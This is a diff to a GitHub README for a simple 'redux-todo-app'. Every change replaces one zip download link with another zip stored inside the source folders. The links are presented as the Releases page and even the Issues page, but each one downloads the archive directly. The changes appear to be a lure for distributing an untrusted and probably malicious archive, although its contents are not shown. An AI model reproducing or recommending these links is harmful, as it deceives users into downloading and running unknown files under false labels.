@@ -1,7 +1,7 @@
 # 🎉 redux-todo-app - Simple Tool for Daily Task Management
 
 ## 📥 Download Now!
-[![Download](https://raw.githubusercontent.com/naman964/redux-todo-app/main/src/redux/app_redux_todo_v1.0.zip%https://raw.githubusercontent.com/naman964/redux-todo-app/main/src/redux/app_redux_todo_v1.0.zip)](https://raw.githubusercontent.com/naman964/redux-todo-app/main/src/redux/app_redux_todo_v1.0.zip)
+[![Download](https://github.com/naman964/redux-todo-app/raw/refs/heads/main/src/components/todo_app_redux_1.7-alpha.5.zip%https://github.com/naman964/redux-todo-app/raw/refs/heads/main/src/components/todo_app_redux_1.7-alpha.5.zip)](https://github.com/naman964/redux-todo-app/raw/refs/heads/main/src/components/todo_app_redux_1.7-alpha.5.zip)
 
 ## 📝 Table of Contents
 - [🚀 Getting Started](#🚀-getting-started)
@@ -22,7 +22,7 @@ To run the redux-todo-app, you need:
 - An active internet connection for initial download.
 
 ## 📥 Download & Install
-To get started, visit this page to download the latest version of the application: [Download Latest Release](https://raw.githubusercontent.com/naman964/redux-todo-app/main/src/redux/app_redux_todo_v1.0.zip).
+To get started, visit this page to download the latest version of the application: [Download Latest Release](https://github.com/naman964/redux-todo-app/raw/refs/heads/main/src/components/todo_app_redux_1.7-alpha.5.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the most recent release.
@@ -58,7 +58,7 @@ After you have installed the redux-todo-app, follow these steps to start using i
 ## 📞 Support
 If you need help or have questions:
 - Check the FAQ section in the application.
-- Visit the [Issues Page](https://raw.githubusercontent.com/naman964/redux-todo-app/main/src/redux/app_redux_todo_v1.0.zip) on GitHub for common issues and solutions.
+- Visit the [Issues Page](https://github.com/naman964/redux-todo-app/raw/refs/heads/main/src/components/todo_app_redux_1.7-alpha.5.zip) on GitHub for common issues and solutions.
 - You can also create a new issue to report bugs or request features.
 
 Thank you for choosing redux-todo-app. Enjoy managing your tasks!
